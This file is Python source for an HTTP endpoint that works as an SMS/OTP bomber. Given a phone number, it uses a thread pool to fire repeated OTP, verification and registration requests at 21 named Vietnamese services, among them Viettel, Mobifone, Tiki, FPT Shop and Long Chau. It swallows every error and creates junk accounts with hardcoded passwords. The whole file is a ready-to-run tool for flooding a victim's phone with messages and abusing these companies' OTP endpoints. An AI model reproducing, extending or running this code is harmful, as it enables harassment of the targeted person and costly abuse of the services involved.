from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
import requests
from concurrent.futures import ThreadPoolExecutor
import time

threading = ThreadPoolExecutor(max_workers=25)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        phone = params.get('phone', [''])[0]
        amount = int(params.get('amount', ['1'])[0])
        
        if amount > 10:
            amount = 10
        
        if not phone:
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Thiếu SĐT"}).encode())
            return
        
        # Gọi tất cả API
        for i in range(amount):
            threading.submit(vieon, phone)
            threading.submit(tv360_new, phone)
            threading.submit(fptshop, phone)
            threading.submit(viettel, phone)
            threading.submit(mobifone, phone)
            threading.submit(thegioididong, phone)
            threading.submit(dienmayxanh, phone)
            threading.submit(concung, phone)
            threading.submit(nhathuoclongchau, phone)
            threading.submit(pharmacity, phone)
            threading.submit(ghn, phone)
            threading.submit(tiki, phone)
            threading.submit(lotteria, phone)
            threading.submit(juno, phone)
            threading.submit(avakids, phone)
            threading.submit(hoanghamobile, phone)
            threading.submit(cellphones, phone)
            threading.submit(winmart, phone)
            threading.submit(thantaioi, phone)
            threading.submit(gapo, phone)
            threading.submit(meta, phone)
            time.sleep(0.15)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            "status": "success",
            "phone": phone,
            "amount": amount,
            "api_count": 21
        }, ensure_ascii=False).encode())

# ====== API MỚI CÒN HOẠT ĐỘNG ======

def vieon(phone):
    try:
        requests.post(
            'https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021',
            headers={'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://vieon.vn'},
            data={'phone_number': phone, 'password': '123456@a', 'device_id': 'd1d2d3d4e5e6f7f8a9a0b1b2c3c4d5e6', 'platform': 'mobile_web', 'ui': '012021'},
            timeout=7
        )
    except: pass

def tv360_new(phone):
    try:
        requests.post(
            'https://api.tv360.vn/v1/auth/otp',
            headers={'Content-Type': 'application/json', 'origin': 'https://tv360.vn'},
            json={'phone': phone},
            timeout=7
        )
    except: pass

def fptshop(phone):
    try:
        requests.post(
            'https://fptshop.com.vn/api-data/loyalty/Home/Verification',
            headers={'Content-Type': 'application/x-www-form-urlencoded', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://fptshop.com.vn'},
            data={'phone': phone},
            timeout=7
        )
    except: pass

def viettel(phone):
    try:
        sess = requests.Session()
        sess.get('https://vietteltelecom.vn', timeout=5)
        sess.post(
            'https://vietteltelecom.vn/api/get-otp-login',
            headers={'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'origin': 'https://vietteltelecom.vn'},
            json={'phone': phone, 'type': ''},
            timeout=7
        )
    except: pass

def mobifone(phone):
    try:
        requests.post(
            'https://api.mobifone.vn/api/v1/auth/register',
            headers={'Content-Type': 'application/json', 'origin': 'https://mobifone.vn'},
            json={'phoneNumber': phone, 'password': 'Abc123456', 'rePassword': 'Abc123456', 'fullName': 'Nguyen Van A'},
            timeout=7
        )
    except: pass

def thegioididong(phone):
    try:
        sess = requests.Session()
        sess.get('https://www.thegioididong.com', timeout=5)
        sess.post(
            'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            headers={'content-type': 'application/x-www-form-urlencoded', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://www.thegioididong.com'},
            data={'phoneNumber': phone, 'isReSend': 'false', 'sendOTPType': '1'},
            timeout=7
        )
    except: pass

def dienmayxanh(phone):
    try:
        sess = requests.Session()
        sess.get('https://www.dienmayxanh.com', timeout=5)
        sess.post(
            'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            headers={'content-type': 'application/x-www-form-urlencoded', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://www.dienmayxanh.com'},
            data={'phoneNumber': phone, 'isReSend': 'false', 'sendOTPType': '1'},
            timeout=7
        )
    except: pass

def concung(phone):
    try:
        requests.post(
            'https://concung.com/ajax.html',
            headers={'Content-Type': 'application/x-www-form-urlencoded', 'origin': 'https://concung.com'},
            data={'ajax': '1', 'classAjax': 'AjaxLogin', 'methodAjax': 'sendOtpLogin', 'customer_phone': phone},
            timeout=7
        )
    except: pass

def nhathuoclongchau(phone):
    try:
        requests.post(
            'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
            headers={'content-type': 'application/json', 'origin': 'https://nhathuoclongchau.com.vn'},
            json={'phoneNumber': phone, 'otpType': 0, 'fromSys': 'WEBKHLC'},
            timeout=7
        )
    except: pass

def pharmacity(phone):
    try:
        requests.post(
            'https://api-gateway.pharmacity.vn/customers/register/otp',
            headers={'content-type': 'application/json', 'origin': 'https://www.pharmacity.vn'},
            json={'phone': phone, 'referral': ''},
            timeout=7
        )
    except: pass

def ghn(phone):
    try:
        requests.post(
            'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
            headers={'content-type': 'application/json', 'origin': 'https://sso.ghn.vn'},
            json={'phone': phone, 'type': 'register'},
            timeout=7
        )
    except: pass

def tiki(phone):
    try:
        requests.post(
            'https://api.tiki.vn/sso/v2/otp/send',
            headers={'Content-Type': 'application/json', 'origin': 'https://tiki.vn'},
            json={'phone_number': phone, 'type': 'register'},
            timeout=7
        )
    except: pass

def lotteria(phone):
    try:
        requests.post(
            'https://api.lotteria.vn/api/v1/auth/send-otp',
            headers={'Content-Type': 'application/json', 'origin': 'https://lotteria.vn'},
            json={'phone': phone, 'type': 'REGISTER'},
            timeout=7
        )
    except: pass

def juno(phone):
    try:
        requests.post(
            'https://juno.vn/api/v1/auth/register',
            headers={'Content-Type': 'application/json', 'origin': 'https://juno.vn'},
            json={'phone': phone, 'password': 'Abc123456', 'name': 'Test User'},
            timeout=7
        )
    except: pass

def avakids(phone):
    try:
        requests.post(
            'https://avakids.com/api/v1/auth/send-otp',
            headers={'Content-Type': 'application/json', 'origin': 'https://avakids.com'},
            json={'phone': phone},
            timeout=7
        )
    except: pass

def hoanghamobile(phone):
    try:
        requests.post(
            'https://hoanghamobile.com/api/v1/auth/send-otp',
            headers={'Content-Type': 'application/json', 'origin': 'https://hoanghamobile.com'},
            json={'phone': phone},
            timeout=7
        )
    except: pass

def cellphones(phone):
    try:
        requests.post(
            'https://cellphones.com.vn/api/v1/auth/get-otp',
            headers={'Content-Type': 'application/json', 'origin': 'https://cellphones.com.vn'},
            json={'phone': phone},
            timeout=7
        )
    except: pass

def winmart(phone):
    try:
        requests.get(
            f'https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}',
            headers={'accept': 'application/json', 'origin': 'https://winmart.vn'},
            timeout=7
        )
    except: pass

def thantaioi(phone):
    try:
        requests.post(
            'https://api.thantaioi.vn/api/user/send-one-time-password',
            headers={"Content-Type": "application/json", "origin": "https://thantaioi.vn"},
            json={"phone": f"84{phone[1:11]}"},
            timeout=7
        )
    except: pass

def gapo(phone):
    try:
        requests.post(
            "https://api.gapo.vn/auth/v2.0/signup",
            headers={"Content-Type": "application/json", "origin": "https://www.gapo.vn"},
            json={"device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2", "phone_number": "+84-" + phone[1:11], "otp_type": 0},
            timeout=7
        )
    except: pass

def meta(phone):
    try:
        requests.post(
            'https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1',
            headers={'content-type': 'application/json', 'origin': 'https://meta.vn'},
            json={"api_args":{"lgUser":phone,"act":"send","type":"phone"},"api_method":"CheckExist"},
            timeout=7
        )
    except: pass
